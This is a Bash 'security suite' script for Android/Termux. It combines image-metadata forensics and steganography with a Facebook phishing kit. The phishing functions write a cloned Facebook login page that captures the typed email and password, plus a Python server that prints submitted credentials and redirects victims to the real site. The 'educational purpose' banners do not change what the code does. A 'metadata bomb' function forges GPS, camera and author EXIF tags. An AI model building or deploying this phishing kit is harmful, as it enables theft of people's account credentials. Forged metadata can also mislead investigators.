#!/bin/bash
# ===============================================
# 🔥 HAKEEM Ultimate Security Suite v7.0
# 👨‍💻 Developed by: Hakeem
# 🎯 All-in-One: Forensics + Steganography + Web Testing
# ===============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Banner
show_banner() {
    clear
    echo -e "${PURPLE}"
    echo "  ██╗  ██╗ █████╗ ██╗  ██╗███████╗███████╗███╗   ███╗"
    echo "  ██║  ██║██╔══██╗██║ ██╔╝██╔════╝██╔════╝████╗ ████║"
    echo "  ███████║███████║█████╔╝ █████╗  █████╗  ██╔████╔██║"
    echo "  ██╔══██║██╔══██║██╔═██╗ ██╔══╝  ██╔══╝  ██║╚██╔╝██║"
    echo "  ██║  ██║██║  ██║██║  ██╗███████╗███████╗██║ ╚═╝ ██║"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝"
    echo -e "${CYAN}     Ultimate Security Suite v7.0${NC}"
    echo -e "${YELLOW}══════════════════════════════════════════════${NC}"
    echo -e "${GREEN}👨‍💻 Developer: Hakeem${NC}"
    echo -e "${BLUE}⚡ Version: 7.0 Complete Edition${NC}"
    echo -e "${YELLOW}══════════════════════════════════════════════${NC}"
}

# Check tools
check_tools() {
    echo -e "${CYAN}🔍 Checking required tools...${NC}"
    
    local missing_tools=()
    
    # Check each tool
    if ! command -v exiftool &> /dev/null; then
        missing_tools+=("exiftool")
    fi
    
    if ! command -v steghide &> /dev/null; then
        missing_tools+=("steghide")
    fi
    
    if ! command -v identify &> /dev/null; then
        missing_tools+=("imagemagick")
    fi
    
    if ! command -v python3 &> /dev/null; then
        missing_tools+=("python")
    fi
    
    # Install missing tools
    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo -e "${YELLOW}📦 Installing missing tools: ${missing_tools[*]}${NC}"
        pkg update -y
        for tool in "${missing_tools[@]}"; do
            pkg install "$tool" -y
        done
    fi
    
    # Create directories
    mkdir -p reports backups clean_output stego_files extracted_files phishing_pages captured_data
    
    # Install Python modules if needed
    if command -v python3 &> /dev/null; then
        python3 -c "import flask" 2>/dev/null || pip install flask
        python3 -c "import requests" 2>/dev/null || pip install requests
    fi
    
    echo -e "${GREEN}✅ All tools are ready!${NC}"
}

# ===============================================
# 📸 IMAGE FORENSICS FUNCTIONS
# ===============================================

# Deep Analysis
deep_scan() {
    echo -e "${CYAN}🎯 Enter image path:${NC}"
    read image_path
    
    if [ ! -f "$image_path" ]; then
        echo -e "${RED}❌ File not found!${NC}"
        return
    fi
    
    filename=$(basename "$image_path")
    report="reports/HAKEEM_$(date +%Y%m%d_%H%M%S)_${filename%.*}.html"
    
    echo -e "${YELLOW}📊 Analyzing $filename...${NC}"
    
    # Create HTML report
    {
        echo "<html><head><title>HAKEEM Report - $filename</title>"
        echo "<style>"
        echo "body{font-family:Arial;margin:20px;background:#f5f5f5}"
        echo ".header{background:#2c3e50;color:white;padding:20px;border-radius:10px}"
        echo ".section{background:white;padding:15px;margin:10px 0;border-radius:5px}"
        echo ".danger{color:#e74c3c;font-weight:bold}"
        echo "</style></head><body>"
        echo "<div class='header'><h1>🔍 HAKEEM Forensic Report</h1>"
        echo "<p>File: $filename | Date: $(date)</p></div>"
        
        # File info
        echo "<div class='section'><h2>📄 File Information</h2>"
        echo "<p><strong>Name:</strong> $filename</p>"
        echo "<p><strong>Size:</strong> $(du -h "$image_path" | cut -f1)</p>"
        echo "<p><strong>Type:</strong> $(file "$image_path")</p></div>"
        
        # EXIF Data
        echo "<div class='section'><h2>📸 EXIF Metadata</h2>"
        exiftool "$image_path" | while read line; do
            if echo "$line" | grep -qi -E "(gps|location|latitude|longitude)"; then
                echo "<p class='danger'>📍 $line</p>"
            else
                echo "<p>$line</p>"
            fi
        done
        echo "</div>"
        
        echo "</body></html>"
    } > "$report"
    
    echo -e "${GREEN}✅ Report created: $report${NC}"
    
    # Auto copy to phone
    if [ -d "/sdcard/Download" ]; then
        cp "$report" "/sdcard/Download/"
        echo -e "${CYAN}📱 Copied to phone: /sdcard/Download/$(basename "$report")${NC}"
    fi
}

# GPS Detection
gps_scan() {
    echo -e "${CYAN}🎯 Enter image path:${NC}"
    read image_path
    
    lat=$(exiftool -n -GPSLatitude "$image_path" 2>/dev/null | cut -d: -f2 | xargs)
    lon=$(exiftool -n -GPSLongitude "$image_path" 2>/dev/null | cut -d: -f2 | xargs)
    
    if [ -n "$lat" ] && [ -n "$lon" ]; then
        echo -e "${GREEN}📍 GPS Found!${NC}"
        echo -e "${CYAN}Latitude: $lat${NC}"
        echo -e "${CYAN}Longitude: $lon${NC}"
        echo ""
        echo -e "${YELLOW}🗺️ Map Links:${NC}"
        echo "Google Maps: https://maps.google.com/?q=$lat,$lon"
        echo "OpenStreetMap: https://www.openstreetmap.org/?mlat=$lat&mlon=$lon"
    else
        echo -e "${RED}❌ No GPS data found${NC}"
    fi
}

# Remove Metadata
clean_file() {
    echo -e "${CYAN}🎯 Enter image path:${NC}"
    read image_path
    
    backup="backups/HAKEEM_backup_$(date +%H%M%S)_$(basename "$image_path")"
    cp "$image_path" "$backup"
    
    echo -e "${YELLOW}🛡️ Cleaning metadata...${NC}"
    exiftool -all= "$image_path" 2>/dev/null
    
    clean="clean_output/HAKEEM_cleaned_$(basename "$image_path")"
    mv "$image_path" "$clean" 2>/dev/null || cp "$image_path" "$clean"
    
    echo -e "${GREEN}✅ Metadata removed!${NC}"
    echo -e "${BLUE}💾 Backup: $backup${NC}"
    echo -e "${GREEN}🧼 Clean file: $clean${NC}"
}

# ===============================================
# 🕵️ STEGANOGRAPHY FUNCTIONS
# ===============================================

# Hide file in image
hide_file() {
    echo -e "${CYAN}🎯 Enter image path (cover image):${NC}"
    read cover_image
    
    if [ ! -f "$cover_image" ]; then
        echo -e "${RED}❌ Cover image not found!${NC}"
        return
    fi
    
    echo -e "${CYAN}📁 Enter file to hide (txt, zip, etc.):${NC}"
    read secret_file
    
    if [ ! -f "$secret_file" ]; then
        echo -e "${RED}❌ Secret file not found!${NC}"
        return
    fi
    
    output="stego_files/HAKEEM_stego_$(date +%H%M%S)_$(basename "$cover_image")"
    
    echo -e "${CYAN}🔐 Enter password (or press Enter for none):${NC}"
    read -s password
    
    echo -e "${YELLOW}🕵️ Hiding file in image...${NC}"
    
    if [ -z "$password" ]; then
        steghide embed -cf "$cover_image" -ef "$secret_file" -sf "$output" 2>/dev/null
    else
        steghide embed -cf "$cover_image" -ef "$secret_file" -sf "$output" -p "$password" 2>/dev/null
    fi
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ File hidden successfully!${NC}"
        echo -e "${BLUE}🔒 Stego image: $output${NC}"
    else
        echo -e "${RED}❌ Failed to hide file${NC}"
    fi
}

# Extract file from image
extract_file() {
    echo -e "${CYAN}🎯 Enter stego image path:${NC}"
    read stego_image
    
    if [ ! -f "$stego_image" ]; then
        echo -e "${RED}❌ Stego image not found!${NC}"
        return
    fi
    
    echo -e "${YELLOW}🔍 Checking for hidden files...${NC}"
    
    echo -e "${CYAN}🔓 Enter password (if any):${NC}"
    read -s password
    
    output_dir="extracted_files/HAKEEM_extracted_$(date +%H%M%S)"
    mkdir -p "$output_dir"
    
    echo -e "${YELLOW}📤 Extracting hidden file...${NC}"
    
    if [ -z "$password" ]; then
        steghide extract -sf "$stego_image" -xf "$output_dir/extracted_file" 2>/dev/null
    else
        steghide extract -sf "$stego_image" -p "$password" -xf "$output_dir/extracted_file" 2>/dev/null
    fi
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ File extracted successfully!${NC}"
        echo -e "${BLUE}📁 Extracted to: $output_dir/${NC}"
    else
        echo -e "${RED}❌ Failed to extract file${NC}"
    fi
}

# ===============================================
# 🌐 FACEBOOK PHISHING FUNCTIONS
# ===============================================

# Create Facebook phishing page
create_fb_phishing() {
    echo -e "${CYAN}🌐 Creating Facebook Phishing Page...${NC}"
    
    page_file="phishing_pages/facebook_login_$(date +%H%M%S).html"
    
    cat > "$page_file" << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { color: #1877f2; font-size: 48px; font-weight: bold; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background: #166fe5; }
        .message { text-align: center; padding: 10px; margin: 10px 0; border-radius: 4px; display: none; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <h2 style="text-align: center;">Log into Facebook</h2>
        
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email address or phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        
        <div class="message" id="message"></div>
        
        <div style="text-align: center; margin-top: 20px; color: #666;">
            <a href="#" style="color: #1877f2; text-decoration: none;">Forgotten password?</a><br><br>
            <hr>
            <button onclick="createAccount()" style="background: #42b72a; margin-top: 15px;">Create New Account</button>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const message = document.getElementById('message');
            
            // Show processing message
            message.textContent = "Checking your information...";
            message.style.display = 'block';
            
            // Simulate login process
            setTimeout(() => {
                // Save to local file (for educational demonstration)
                const data = {
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString(),
                    ip: window.location.hostname
                };
                
                // Display message
                message.textContent = "Login information processed (Educational Demo)";
                message.className = "message success";
                
                // Log to console
                console.log("Educational Demo - Credentials:", data);
                
                // Redirect after 3 seconds
                setTimeout(() => {
                    window.location.href = "https://www.facebook.com/";
                }, 3000);
            }, 1500);
        });
        
        function createAccount() {
            alert("Account creation is disabled in this educational demonstration.");
        }
    </script>
    
    <!-- Educational Purpose Notice -->
    <div style="text-align: center; margin-top: 30px; padding: 10px; background: #fff3cd; border-radius: 4px;">
        <strong>⚠️ EDUCATIONAL PURPOSE ONLY</strong><br>
        This is a demonstration page for cybersecurity education.<br>
        No real credentials are collected or stored.
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}✅ Facebook page created: $page_file${NC}"
    echo -e "${YELLOW}📁 To serve locally:${NC}"
    echo "   cd $(pwd)/phishing_pages"
    echo "   python3 -m http.server 8080"
    echo "   Then open: http://localhost:8080/$(basename "$page_file")"
}

# Start phishing server
start_phishing_server() {
    echo -e "${CYAN}🚀 Starting Educational Phishing Server...${NC}"
    
    server_script="phishing_pages/server_$(date +%H%M%S).py"
    
    cat > "$server_script" << 'EOF'
#!/usr/bin/env python3
"""
Educational Phishing Server - For cybersecurity training only
"""

import http.server
import socketserver
import json
from datetime import datetime

PORT = 8080
LOG_FILE = "educational_log.json"

class EducationalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Serve the Facebook page
        if self.path == '/':
            self.path = '/facebook_login.html'
        
        # Log access
        self.log_access()
        
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
    
    def do_POST(self):
        # Handle form submission (educational only)
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse form data
        import urllib.parse
        data = urllib.parse.parse_qs(post_data)
        
        # Log for educational purposes
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'data': data,
            'note': 'EDUCATIONAL DEMONSTRATION - No real data stored'
        }
        
        print(f"[EDUCATIONAL] Demo form submission: {log_entry}")
        
        # Redirect to real Facebook
        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com/')
        self.end_headers()
    
    def log_access(self):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'path': self.path,
            'user_agent': self.headers.get('User-Agent', 'Unknown')
        }
        
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
        except:
            pass
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

print("=" * 60)
print("EDUCATIONAL PHISHING SERVER - FOR TRAINING ONLY")
print("=" * 60)
print(f"Server running on port {PORT}")
print("Access: http://localhost:{PORT}")
print("")
print("⚠️  WARNING: This is for educational purposes only.")
print("    No real credentials are collected or stored.")
print("=" * 60)

# Change to phishing_pages directory
import os
os.chdir('phishing_pages')

# Start server
with socketserver.TCPServer(("", PORT), EducationalHandler) as httpd:
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
EOF
    
    chmod +x "$server_script"
    
    echo -e "${GREEN}✅ Server script created: $server_script${NC}"
    echo -e "${YELLOW}🚀 To start server:${NC}"
    echo "   python3 $server_script"
    echo ""
    echo -e "${RED}⚠️  IMPORTANT: For educational purposes only!${NC}"
}

# View captured data (educational)
view_captured_data() {
    echo -e "${CYAN}📊 Viewing Educational Logs...${NC}"
    
    if [ -f "phishing_pages/educational_log.json" ]; then
        echo -e "${YELLOW}📁 Log file contents:${NC}"
        head -20 "phishing_pages/educational_log.json"
        echo ""
        echo -e "${GREEN}Total entries: $(wc -l < "phishing_pages/educational_log.json")${NC}"
    else
        echo -e "${RED}❌ No log file found${NC}"
        echo -e "${YELLOW}ℹ️ Start the server first to generate logs${NC}"
    fi
}

# ===============================================
# ⚡ ADVANCED FUNCTIONS
# ===============================================

# Metadata bomb
metadata_bomb() {
    echo -e "${CYAN}🎯 Enter image path:${NC}"
    read image_path
    
    backup="backups/HAKEEM_bomb_backup_$(basename "$image_path")"
    cp "$image_path" "$backup"
    
    echo -e "${YELLOW}💣 Adding fake metadata...${NC}"
    
    # Add fake GPS (Egyptian pyramids)
    exiftool -GPSLatitude="29.9792" -GPSLongitude="31.1342" -GPSLatitudeRef="N" -GPSLongitudeRef="E" "$image_path" 2>/dev/null
    
    # Add fake camera info
    exiftool -Make="HAKEEM Security" -Model="Forensic Cam X100" "$image_path" 2>/dev/null
    
    # Add fake author
    exiftool -Artist="Hakeem Forensic Lab" -Copyright="© 2024 Educational Use Only" "$image_path" 2>/dev/null
    
    echo -e "${GREEN}✅ Fake metadata added!${NC}"
    echo -e "${BLUE}💾 Original backup: $backup${NC}"
}

# Bulk processing
bulk_process() {
    echo -e "${CYAN}📁 Enter folder path:${NC}"
    read folder_path
    
    if [ ! -d "$folder_path" ]; then
        echo -e "${RED}❌ Folder not found!${NC}"
        return
    fi
    
    echo -e "${YELLOW}⚡ Processing all images in folder...${NC}"
    
    count=$(find "$folder_path" -type f \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" \) | wc -l)
    
    if [ $count -eq 0 ]; then
        echo -e "${RED}❌ No images found${NC}"
        return
    fi
    
    echo -e "${CYAN}Found $count images${NC}"
    echo "1. Remove metadata from all"
    echo "2. Extract GPS from all"
    echo "3. Create reports for all"
    read -p "Select option: " bulk_choice
    
    case $bulk_choice in
        1)
            find "$folder_path" -type f \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" \) -exec exiftool -all= {} \;
            echo -e "${GREEN}✅ Metadata removed from $count images${NC}"
            ;;
        2)
            gps_file="reports/bulk_gps_$(date +%H%M%S).txt"
            find "$folder_path" -type f \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" \) -exec exiftool -GPS* {} \; > "$gps_file"
            echo -e "${GREEN}✅ GPS data extracted to: $gps_file${NC}"
            ;;
        3)
            processed=0
            find "$folder_path" -type f \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" \) | while read img; do
                report="reports/bulk_$(basename "${img%.*}").html"
                exiftool "$img" > "$report" 2>/dev/null
                ((processed++))
                echo -e "${BLUE}Processed: $processed/$count${NC}"
            done
            echo -e "${GREEN}✅ Created reports for $count images${NC}"
            ;;
        *)
            echo -e "${RED}❌ Invalid option${NC}"
            ;;
    esac
}

# ===============================================
# 📋 MAIN MENU
# ===============================================

main_menu() {
    while true; do
        show_banner
        check_tools
        
        echo -e "${CYAN}━━━━━━ IMAGE FORENSICS ━━━━━━${NC}"
        echo -e "${GREEN}【1】📊 Deep Analysis + HTML Report${NC}"
        echo -e "${GREEN}【2】📍 GPS Detection & Map Links${NC}"
        echo -e "${GREEN}【3】🛡️ Remove Metadata + Backup${NC}"
        echo ""
        echo -e "${BLUE}━━━━━━ STEGANOGRAPHY ━━━━━━${NC}"
        echo -e "${BLUE}【4】📎 Hide File in Image${NC}"
        echo -e "${BLUE}【5】🔓 Extract File from Image${NC}"
        echo ""
        echo -e "${PURPLE}━━━━━━ WEB TESTING ━━━━━━${NC}"
        echo -e "${PURPLE}【6】🌐 Create Facebook Page (Educational)${NC}"
        echo -e "${PURPLE}【7】🚀 Start Phishing Server${NC}"
        echo -e "${PURPLE}【8】📊 View Educational Logs${NC}"
        echo ""
        echo -e "${YELLOW}━━━━━━ ADVANCED TOOLS ━━━━━━${NC}"
        echo -e "${YELLOW}【9】💣 Add Metadata Bomb${NC}"
        echo -e "${YELLOW}【10】⚡ Bulk Process Folder${NC}"
        echo -e "${YELLOW}【11】📁 Open File Browser${NC}"
        echo ""
        echo -e "${RED}【0】🚪 Exit${NC}"
        echo ""
        echo -e "${YELLOW}══════════════════════════════════════════════${NC}"
        
        read -p "➤ Select option [0-11]: " choice
        
        case $choice in
            1) deep_scan ;;
            2) gps_scan ;;
            3) clean_file ;;
            4) hide_file ;;
            5) extract_file ;;
            6) create_fb_phishing ;;
            7) start_phishing_server ;;
            8) view_captured_data ;;
            9) metadata_bomb ;;
            10) bulk_process ;;
            11)
                echo -e "${CYAN}📁 Directory Contents:${NC}"
                ls -la reports/ backups/ clean_output/ stego_files/ extracted_files/ phishing_pages/ 2>/dev/null
                ;;
            0)
                echo -e "${GREEN}👋 Thank you for using HAKEEM Security Suite!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Invalid option${NC}"
                ;;
        esac
        
        echo ""
        read -p "➤ Press Enter to continue..."
    done
}

# Start the tool
main_menu
